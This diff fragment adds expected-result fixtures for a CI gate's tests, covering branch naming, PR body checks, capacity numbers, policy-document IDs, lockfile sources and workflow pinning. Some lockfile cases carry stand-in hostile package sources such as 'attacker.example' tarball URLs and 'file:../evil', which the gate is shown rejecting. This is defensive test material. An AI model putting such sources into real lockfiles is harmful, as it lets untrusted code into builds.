+        ((('PR_HEAD_REF', 'chore/foo/bar'),), ('scripts/gate/helper.py',), 'ce9defe90fb993369b8d55a9243f13d0f091871aad4f53d527c9d51fabf6184c', None, 0, (), 1, (" - branch 'chore/foo/bar' changes 1 gated file(s) (scripts/gate/helper.py) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'chore/Bad'),), ('scripts/gate/helper.py',), '2b77975f1513188c38e113ae7c027fb15ec80cb71324655bea7e50ae4ed5cab0', None, 0, (), 1, (" - branch 'chore/Bad' changes 1 gated file(s) (scripts/gate/helper.py) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'bot/superpowers-x/y'),), ('scripts/gate/helper.py',), '0c052836cc82fadba32411840ac3c4a417a45cb5913d2444c1d6334a6fc70ab3', None, 0, (), 1, (" - branch 'bot/superpowers-x/y' changes 1 gated file(s) (scripts/gate/helper.py) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/brainstorming/SKILL.md',), 'ada973ec360acc2b70f3ef009348aeb9e828ac103629e92332a2be70540650c4', None, 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'bot/superpowers-weekly'),), ('.claude/skills/product-delivery/SKILL.md',), 'da65df0de0d3f15df345178adf146c75b6e291bcb54b2eaa59bbdf95737576ac', None, 0, (), 1, (" - branch 'bot/superpowers-weekly' changes 1 gated file(s) (.claude/skills/product-delivery/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'main'),), ('docs/notes.md',), '4f42053467dc0a0ae18a1695b9982b215d4243165d4a5f05e2338357c68bf9ac', None, 0, (), 1, (" - branch 'main' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
+        ((('PR_HEAD_REF', 'typo'),), ('docs/notes.md',), '39967100e90470cc4bb2f37e4be4253348e0550c4ff18e3869922e410c659bd8', None, 0, (), 1, (" - branch 'typo' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
+        ((('PR_HEAD_REF', 'claude/notes'),), ('docs/notes.md',), '991eb9000a8458635c022b52cab94961c7ac30d1a1819907ec9b8baea1bb6fe1', None, 0, (), 1, (" - branch 'claude/notes' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
+        ((('PR_HEAD_REF', 'feature/typo'),), ('docs/notes.md',), 'b47752e9473eeff91416bd77b11f44b47e81af69362bfad7944e12aa2c036292', None, 0, (), 1, (" - branch 'feature/typo' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
+        ((('PR_HEAD_REF', 'fix/wrong'),), ('docs/notes.md',), '826fd1bdec7a6129e561ef316089afdb834607682afe42841ee330784f3f14fe', None, 0, (), 1, (" - branch 'fix/wrong' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
+        ((('PR_HEAD_REF', 'docs/Bad_Name'),), ('docs/notes.md',), 'd520093cefec0e98775f34a0497fd0351b96c742b36fab8e5dd4bd5c61e6cc45', None, 0, (), 1, (" - branch 'docs/Bad_Name' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-a_b'),), ('docs/notes.md',), 'e7b8530ff5a4919b8f4166be6dae6c14ce3fc652041affa8a466fc52317f4656', None, 0, (), 1, (" - branch 'feature/feat-model-001-a_b' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
+        ((('PR_HEAD_REF', 'fix/feat-model-001-a.b'),), ('docs/notes.md',), 'e1cef4264e6c625884aa8b3d5560de793bf8217d7fe935de46990caff05d533b', None, 0, (), 1, (" - branch 'fix/feat-model-001-a.b' is not a delivery branch; a pull request comes from feature/<feat-id>-<slug>, fix/<feat-id>-<slug>, docs/<slug>, chore/<slug> or bot/superpowers-<tag>, documentation included",)),
+        ((('PR_HEAD_REF', 'docs/notes'),), ('docs/notes.md',), '67f60b3e70fff3ca94946aba41667a1ca925e198d5d7c3ea5780f634b240a307', None, 0, (), 0, ()),
+        ((('PR_DRAFT', 'false'), ('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_NUMBER', '42'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/02-FEATURE-CATALOG.md',), '9cc08bee1bcaed0ca9a4a551b913d66445cfb734fe5f4caa0b7256adc5c1700e', '3b4f7f730d2478256a1a38710b7a61cb46b7e9ef8671a9e7eba514fa781f8e34', 0, (), 1, (" - docs/superpowers/plans/2026-09-01-model-decisions.md: set the plan's pr to 42 before marking the PR ready",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'),), ('docs/product/02-FEATURE-CATALOG.md',), '9cc08bee1bcaed0ca9a4a551b913d66445cfb734fe5f4caa0b7256adc5c1700e', None, 0, (), 1, (" - no plan in docs/superpowers/plans names branch 'feature/feat-model-001-model-decisions'",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.github/workflows/ci.yml', 'lib/model.py'), 'd21a7b14eb51088cbda8403ec26b5d207e8e20bbcf9e46595ad00d577be083f2', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - process change(s) (.github/workflows/ci.yml) belong to FEAT-CICD-001, not FEAT-MODEL-001; CI configuration, the gate and the agent instructions are that capability's work",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.github/workflows/ci.yml', 'lib/model.py'), 'd21a7b14eb51088cbda8403ec26b5d207e8e20bbcf9e46595ad00d577be083f2', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'docs/tweak'),), ('AGENTS.md',), '140283191b249eb55f902669754fdb675720276303b2630d2c402844d6fada12', None, 0, (), 1, (" - branch 'docs/tweak' changes 1 gated file(s) (AGENTS.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'docs/tweak'),), ('CLAUDE.md',), '3e3f424cfbea900869edc82afeac0a1f35575d66b56bef789bee0d898558b77b', None, 0, (), 1, (" - branch 'docs/tweak' changes 1 gated file(s) (CLAUDE.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'docs/skill-tweak'),), ('.claude/skills/product-delivery/SKILL.md',), 'cc0b2f8e3f684e3507f173883bcb67d06644e9b2b8e028e7136767f688c24d9b', None, 0, (), 1, (" - branch 'docs/skill-tweak' changes 1 gated file(s) (.claude/skills/product-delivery/SKILL.md) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'docs/workflow-notes'),), ('.github/workflows/README.md', 'gcp/README.md'), '08bcd199b78bd84384bda2dafbcc09d0e5e4bf85c50441e2bc3effb74db3a7e8', 'db48a9197010e0debbf2c745beaa8cad35619c4485ebebad48ebd7e6322bbd7a', 0, (), 0, ()),
+    ),
+    'test_the_pr_body_contract_is_read_as_rendered_in_every_form': (
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py',), '41fb63ef08e25e0fbcd324a1d943f84230530ce2fd2189cce8e3ecbf4584b5f0', '91a983430bdbb98626ba67e8e5b1e6b9c877cd2b1042e6f301738160ed2fe49a', 0, (), 1, (' - PR body must link the spec the plan names: docs/superpowers/specs/2026-09-01-model-decisions.md', ' - PR body must link the plan: docs/superpowers/plans/2026-09-01-model-decisions.md')),
+        ((('PR_DRAFT', 'false'), ('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_NUMBER', '42'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('docs/product/02-FEATURE-CATALOG.md', 'docs/superpowers/plans/2026-09-01-model-decisions.md', 'lib/model.py'), '2b22f1d0861051407302d30782af37f0d1b9ed6c5c09ceda58a052a9765fe41e', '5c806a56aeaedddf4f01fab9333cb081a541044af811e2526a4584da3b44e605', 0, (), 1, (' - ready for review with done_when item(s) not ticked: every model states its decision; the registry test passes',)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', 'a0b202e0b1af1b099ed9398a0e0c89077a43279c6c1195ea9fe70929cfe554e7', 0, ('$0.01',), 1, (" - PR body's Capacity section leaves Volume blank; give the numbers, or write 'n/a: <why no workload runs differently>'",)),
+    ),
+    'test_capacity_values_are_numbers': (
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '50f7fa8981ef8a80c6164f3e589310ea385a0ac87c6fa2c3dc5498a7e7688e76', 0, ('TBD',), 1, (" - PR body's Capacity section gives no number for Volume, Velocity, Wall-clock, 30; each value starts with its figure (rows, calls, seconds, dollars), or the section says 'n/a: <why no workload runs differently>'",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '00946b25d43152c3ee03fd2d8b63b8fdb92bcb013ddc338d571d26d3a49aea12', 0, ('$0.01',), 1, (" - PR body's Capacity section gives no number for Velocity; each value starts with its figure (rows, calls, seconds, dollars), or the section says 'n/a: <why no workload runs differently>'",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', 'bee90077581ea6817dc276e742ad782ee1b2040cb5cdeaee6658cfa6bd6c330a', 0, ('$0.01',), 0, ()),
+    ),
+    'test_contract_commands_run_and_policy_documents_keep_their_ids': (
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), 'f022247207ce3536cb8f26bb031e9c945144f689c59fcf9a66e11f83cf65de77', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), '5197d58425caa7b7a0e5933f49e69eb080e5bacc7a6ee3ff7d9347cf3446ead8', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), 'e4586250d4b114cc39f9088488eae5b3f9a840542d407e280f3d1f9c807872c6', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), '1c72d50e517c4685ef59c02cd87d149f0ff9148e61b511ad37624da1625b7946', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), 'e3f4acbd7df5561b786928e0ab2a0ddc385de2e306adad749449f8ce5696af76', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/registry-check.yml: no longer executes 3 step(s) the gate depends on (\'python3 -m py_compile "$gate"\' and more); a command in a comment, an echo, an unused scalar or a step an `if:` may skip does not count. The gate\'s workflows keep their checks',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/registry-check.yml',), 'ed82e4a4c7ef2af589ea79ed5f166342efb620d6a37e415189306c8abeadb817', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/02-FEATURE-CATALOG.md',), '5a817fb579a5f755f11be34d7f1db7487224d0828eb919a8ac7868c3c83ae6bd', None, 0, (), 1, (" - docs/product/02-FEATURE-CATALOG.md: the table no longer carries the PRs column the close-out reads; the catalog's columns keep their names", " - docs/product/02-FEATURE-CATALOG.md: FEAT-DATA-001 no longer carries the Status, Last reviewed field(s) the close-out reads; the catalog's columns and record fields keep their names", ' - docs/product/02-FEATURE-CATALOG.md: no longer defines 2 ID(s) the base has (FEAT-DATA-001 and more); a policy document is extended in a branch, never emptied or pruned')),
+        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/02-FEATURE-CATALOG.md',), '88c81548c93fe3919b7526ab2ad2763b4d3c661470a000d17e60a81db72aabe6', None, 0, (), 1, (" - docs/product/02-FEATURE-CATALOG.md: the table no longer carries the PRs column the close-out reads; the catalog's columns keep their names", " - docs/product/02-FEATURE-CATALOG.md: FEAT-DATA-001 no longer carries the Status, Last reviewed field(s) the close-out reads; the catalog's columns and record fields keep their names", ' - docs/product/02-FEATURE-CATALOG.md: no longer defines 2 ID(s) the base has (FEAT-DATA-001 and more); a policy document is extended in a branch, never emptied or pruned')),
+        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/01-PRODUCT-REQUIREMENTS.md',), 'a804256d403844f526e25ef9cf82d494bb9ca6170a088dbd38deca93aaaaf3cb', None, 0, (), 1, (' - docs/product/01-PRODUCT-REQUIREMENTS.md: no longer defines 2 ID(s) the base has (REQ-DATA-001 and more); a policy document is extended in a branch, never emptied or pruned',)),
+        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/02-FEATURE-CATALOG.md',), 'c81470e30f6c7d9e6062ed384194a1f688a0313abd800e2d036eea2daa528ebb', None, 0, (), 1, (" - docs/product/02-FEATURE-CATALOG.md: FEAT-DATA-001 no longer carries the Status, Last reviewed field(s) the close-out reads; the catalog's columns and record fields keep their names", ' - docs/product/02-FEATURE-CATALOG.md: no longer defines 1 ID(s) the base has (FEAT-DATA-001); a policy document is extended in a branch, never emptied or pruned')),
+        ((('PR_HEAD_REF', 'docs/cleanup'),), ('docs/product/02-FEATURE-CATALOG.md',), '557366fe6473f007e5da635a427ce27e87708a3f4a0c67219328f9627cd3152c', None, 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', 'e7483541f0f50a0a8e4ba458a4399ad1a5db663143701c2a626d4dbcdfb1bf18', 0, ('$0.01',), 1, (" - PR body's Capacity section gives no number for Volume, Velocity, Wall-clock; each value starts with its figure (rows, calls, seconds, dollars), or the section says 'n/a: <why no workload runs differently>'",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('gcp/model_job.py', 'lib/model.py'), 'e565c81ec3816cbb67851dcc222bd81d56195520288d51e887be66be594b0286', '8c29f4efa3cef689ba8e5bca9c80e6ee0ce4dda675eb28a15b2ca028e74f94ed', 0, ('$0.01',), 0, ()),
+    ),
+    'test_lockfiles_twin_workflows_pins_at_step_one_and_ownership_are_the_contract': (
+        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), '400dce939e927914e2db364414b479fbe5fd20feec9499e44cf23220b0f96c13', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from 'https://attacker.example/lodash-4.17.21.tgz'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), 'ea5fe23049730981ba73172507b00855e160c79eeed3ef94b50c90d16c117e01', None, 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), 'f64a220e03ef123d5836f3a9a04885164eaedd8df01645df93218b111cd2bc89', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from 'https://HTTPS://attacker.example/lodash-4.17.21.tgz'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), '400dce939e927914e2db364414b479fbe5fd20feec9499e44cf23220b0f96c13', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from 'https://attacker.example/lodash-4.17.21.tgz'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), 'bdc185d6baf71e0c4fe3c770c360731373dab12b9982c423a1e0a7851b02ba3c', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from 'https://attacker.example/lodash-4.17.21.tgz'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), 'daf2537fc665f4a986230eb70493c4c8faa5b55b9bc107fee212724aa649b5a7', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from 'file:../evil'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'chore/bump'),), ('package-lock.json',), '73e0a9338e13c46e1d79ae9604184a6453df38356dba52808a34134d969a6008', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (package-lock.json) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - package-lock.json: resolves a package from '//attacker.example/l.tgz'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'chore/bump'),), ('uv.lock',), '8af6e73af3e7a5ef18a79827a6a11dd2d50a3960cc5b5b07b7788b88884da04c', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (uv.lock) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - uv.lock: resolves a package from 'source:editable'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'chore/bump'),), ('uv.lock',), '79a6d0091e39cc2debc8678b7d17edc32217ace6142e7d02d6306c50de1ca6c8', None, 0, (), 0, ()),
+        ((('PR_HEAD_REF', 'chore/bump'),), ('poetry.lock',), '7d974ee3bd8d7e0f9cf1d34fe9c62642ac426f85155c19e31c25c115a7dc63ba', None, 0, (), 1, (" - branch 'chore/bump' changes 1 gated file(s) (poetry.lock) but is not feature/<feat-id>-<slug> or fix/<feat-id>-<slug>.", " - poetry.lock: resolves a package from 'source:type,url'; a chore/ branch installs from the public registries over https only", " - docs/ carries documentation only; chore/ covers dependency manifests (dependency fields only), lockfiles and the gate's own files; anything else needs a FEAT-ID branch with an approved spec and a plan.")),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.github/workflows/spec-gate2.yml', 'lib/model.py'), 'c135c15b5b73fa8688b594f9f9adb982d7bf07ac095aa6707a2473d2fcd6ac1c', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - .github/workflows/spec-gate2.yml: takes the name or a job key of .github/workflows/spec-gate.yml (spec-gate); a required check's name belongs to the gate's workflow alone",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.github/workflows/Spec-Gate.yml', 'lib/model.py'), 'f1e28b70462c0bd54992b135b17558248f5fbe19eee8ff6a84f239b7246a17a9', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - .github/workflows/Spec-Gate.yml: takes the name or a job key of .github/workflows/spec-gate.yml (spec-gate); a required check's name belongs to the gate's workflow alone",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.github/workflows/rc2.yml', 'lib/model.py'), 'e507a66093455ea968ef4612b434259cf9842bede262af1bd10b1f8bb1cec7f9', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - .github/workflows/rc2.yml: takes the name or a job key of .github/workflows/spec-gate.yml (spec-gate); a required check's name belongs to the gate's workflow alone",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/rc2.yml',), '6c2f2e6c81ebce1c46ff6db831cd3f40c329860aa53a23108f1111182ddb4a43', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/rc2.yml: takes the name or a job key of .github/workflows/registry-check.yml (registry-check); a required check's name belongs to the gate's workflow alone",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('scripts/gate/pinned/spec-gate.yml',), 'b183555000a49f70d021d088b0d396cc0ee99f22d806c7b8714a06967f2efdb7', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - scripts/gate/pinned/spec-gate.yml: is not valid YAML (while parsing a flow sequence); GitHub would not load the workflow and every later PR would lose the gate',)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('scripts/gate/pinned/spec-gate.yml',), 'f0e9d11f5544b52de709153cd5d1eda42fca5b9c550646f9784e4243a1573d14', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - scripts/gate/pinned/spec-gate.yml: grants a write permission (contents: write); the gate's workflows run head-controlled code on a read-only token, at the top level and in every job",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('lib/model.py', 'scripts/gate/pinned/spec-gate.yml'), 'db61c55ba29ff89ff050c1e49e35d8e578469c3284f5e84f0bc8985ce4565881', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - process change(s) (scripts/gate/pinned/spec-gate.yml) belong to FEAT-CICD-001, not FEAT-MODEL-001; CI configuration, the gate and the agent instructions are that capability's work",)),
+        ((('PR_HEAD_REF', 'feature/feat-model-001-model-decisions'), ('PR_TITLE', 'FEAT-MODEL-001: x')), ('.claude/skills/product-delivery/SKILL.md', 'lib/model.py'), '7519511b17400921aa5b754f1ce9324cb74bf77e0d2d2ce473058f60ef4fd9b8', 'bf7ca8eab6f20eb42f53cfcffa6670c18dda1a5b00bcc36a133d6b493135780a', 0, (), 1, (" - process change(s) (.claude/skills/product-delivery/SKILL.md) belong to FEAT-CICD-001, not FEAT-MODEL-001; CI configuration, the gate and the agent instructions are that capability's work",)),
+        ((('PR_HEAD_REF', 'chore/gate-hook'),), ('scripts/gate/pinned/pre-commit',), 'a168824ba51198fcf456c7ebe1fabbda7b0348f2e5dffaf63774f3f4f26f1ea3', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - scripts/gate/pinned/pre-commit: line 'git reset -q' is not one the hook may carry; the hook checks the Python version, refuses unstaged gate edits and calls the gate, nothing else",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '32836c0c5d50e21ef91ae99de3a93b20e1bb23af7e2388366f77bb7082e00622', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: puts a comment where a value goes (permissions: #); the gate's workflows write the value or nothing; GitHub would not load the workflow and every later PR would lose the gate",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'c9b8c5186b099034a99686193ef9216a4cb2b6a2b9c22d0c1b6ac63aa95350f0', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: uses YAML's explicit-key syntax (`? key`); the gate's workflows write `key:`; GitHub would not load the workflow and every later PR would lose the gate",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), '68194e07f72ff5cadd2d68584b6dcd3276e426ad26334f632c2c17692acaedfc', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: spells the trigger key as a boolean; the gate's workflows write `on:`; GitHub would not load the workflow and every later PR would lose the gate",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), ('.github/workflows/spec-gate.yml',), 'e03e634f07afe16e4bbff034e9ad3533f687b282e75510cae3b7aa2c76c37824', '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (" - .github/workflows/spec-gate.yml: checkout step sets `github-server-url`; the gate's checkouts set ref, fetch-depth and persist-credentials only; the gate's workflows check out the side the contract names",)),
+        ((('PR_HEAD_REF', 'chore/gate-workflow'),), None, None, '424d56fa4c538ec662d8adf3b9676565c60372b7a212ec9b3b4fb1d5f3c2bd8b', 0, (), 1, (' - .github/workflows/spec-gate.yml: differs from its pinned copy scripts/gate/pinned/spec-gate.yml on the base; change the pinned copy in its own PR first, then make the file equal to it. A gate workflow or hook is never edited freely',)),
